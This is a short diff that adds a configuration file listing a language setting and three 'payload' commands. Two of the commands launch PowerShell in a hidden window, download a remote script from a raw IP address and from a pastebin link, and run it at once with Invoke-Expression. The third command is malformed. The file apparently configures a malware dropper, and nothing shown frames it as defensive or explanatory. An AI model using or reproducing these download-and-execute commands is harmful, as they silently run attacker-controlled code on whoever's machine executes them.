@@ -1,0 +1,4 @@
+language: FR
+payload1: powershell -WindowStyle Hidden -Command "curl http://13.95.212.250:8000/chimeraTHIS.ps1 -UseBasicParsing | Invoke-Expression"
+payload2: powershell -WindowStyle Hidden -Command "curl https://pastebin.com/raw/mUKrCLea -UseBasicParsing | Invoke-Expression"
+payload3: powershell -WindowStyle Hidden -Command "paint -UseBasicParsing | Invoke-Expression"
